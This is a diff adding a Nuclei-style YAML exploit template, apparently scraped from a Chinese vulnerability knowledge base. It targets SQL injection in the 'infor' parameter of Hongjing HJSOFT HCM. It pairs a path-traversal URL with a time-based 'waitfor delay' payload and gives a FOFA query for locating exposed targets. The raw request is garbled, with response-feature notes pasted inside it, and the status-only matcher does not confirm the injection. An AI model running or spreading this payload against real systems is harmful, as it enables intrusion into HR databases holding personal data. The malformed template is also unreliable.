@@ -1,0 +1,34 @@
+id: poc-ivx62cxsohcyn5dv
+info:
+  name: 宏景系统infor参数sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ivx62cxsohcyn5dv'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ivx62cxsohcyn5dv
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=11'';waitfor+delay+''0:0:6''--+ HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
